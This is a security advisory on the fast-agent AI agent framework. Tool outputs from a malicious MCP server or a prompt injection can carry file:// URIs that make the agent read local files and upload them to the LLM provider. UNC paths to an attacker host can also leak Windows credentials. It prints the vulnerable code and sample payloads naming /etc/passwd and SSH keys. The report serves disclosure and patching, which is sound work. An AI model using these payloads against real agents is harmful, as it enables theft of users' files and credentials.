CVD-2026-FAST-AGENT-001: Arbitrary Local File Read & Windows UNC Path Exfiltration via file:// URLs in Tool Call Outputs (io/path_uri.py & responses_files.py)

High (CVSS 8.5) CWE-22 / CWE-200 GitHub CNA PVR: evalstate/fast-agent
Target Repository: evalstate/fast-agent (commit 5c4453b8e1, 2026-10-21T23:41:35Z)
Affected Component: src/fast_agent/io/path_uri.py (lines 15-44) & src/fast_agent/llm/provider/openai/responses_files.py (lines 90-142, 206-250)
Researcher: Serhii Shunko (@sshunko / @ccsimplyspolit, ORCID 0009-0002-4183-0361)

1. Summary

During a defensive static source audit of `https://github.com/evalstate/fast-agent` (`main` branch, commit `5c4453b8e1` / `bd25272098`, pushed `2026-10-21T23:41:35Z`), I identified an arbitrary local file read and Windows SMB/UNC path traversal vulnerability introduced in commit `bd25272098` (*'fix: resolve local document file URIs (#1027)'*): 1. **Unrestricted `file://` Resolution & Upload from Untrusted Tool Outputs (`CWE-22` / `CWE-200`, `responses_files.py:90-142, 206-250`)**: `_normalize_input_files()` calls `_normalize_output_item()` for every `function_call_output` and `custom_tool_call_output` item, which invokes `_normalize_input_image_part()` and `_file_bytes_from_url()` -> `local_file_url_path(file_url)`. Because `local_file_url_path()` performs no workspace containment or symlink check, a remote or untrusted MCP server returning a tool output containing `{"type": "input_file", "file_url": "file:///etc/passwd"}` (or `file:///Users/.../.ssh/id_rsa`) causes `fast-agent` to read the arbitrary host file via `local_path.read_bytes()` and upload its contents to the external LLM provider (`client.files.create` / inline `data:` base64). 2. **Remote SMB / UNC Path Resolution in `file_uri_to_path()` (`CWE-200`, `src/fast_agent/io/path_uri.py:24-27`)**: When `parsed.netloc` is non-empty and not `'localhost'`, `file_uri_to_path()` constructs `uri_path = f'//{parsed.netloc}{uri_path}'` (`Path('//attacker.example.com/share/file.pdf')`). Calling `path.is_file()` and `read_bytes()` on a UNC path on Windows initiates an outbound SMB connection and leaks NetNTLMv2 credentials.

2. Root Cause Analysis

- **`src/fast_agent/io/path_uri.py:24-44`**:
```python
    uri_path = parsed.path
    if parsed.netloc and strip_casefold(parsed.netloc) != "localhost":
        uri_path = f"//{parsed.netloc}{uri_path}"
        if pathname_decoder is url2pathname:
            return Path(unquote(uri_path))
    return Path(pathname_decoder(uri_path))


def local_file_url_path(file_url: str) -> Path | None:
    if not file_url.startswith("file://"):
        return None
    unencoded = Path(file_url.removeprefix("file://"))
    if unencoded.drive:
        candidates: tuple[Path, ...] = (unencoded,)
    else:
        candidates = (file_uri_to_path(urlparse(file_url)), unencoded)
    return next((path for path in candidates if path.is_file()), None)
```

3. Steps to Reproduce (BEFORE PATCH vs. AFTER PATCH)

Run the standalone verification test suite in `verify_batch9_fresh_ai_cna.py` (`test_02_fast_agent_local_file_uri_traversal_and_unc`):
```bash
uv run verify_batch9_fresh_ai_cna.py
```
- **BEFORE PATCH**: `resolve_uri_before('file://192.0.2.99/share/secret.pdf', '/app/workspace')` returns `'//192.0.2.99/share/secret.pdf'`, and `resolve_uri_before('file:///etc/passwd', '/app/workspace')` resolves `'/etc/passwd'`.
- **AFTER PATCH**: Rejects remote `file://` netlocs and UNC paths, enforces workspace root containment and symlink rejection in `local_file_url_path()`, and does not resolve local `file://` URLs inside untrusted `function_call_output` / `custom_tool_call_output` items.

5. Security Impact

A malicious or compromised remote MCP server or prompt injection returning an `input_file` / `input_image` block with a `file://` URI can exfiltrate arbitrary local files from the host machine into the LLM conversation or trigger outbound Windows SMB/NTLM authentication.
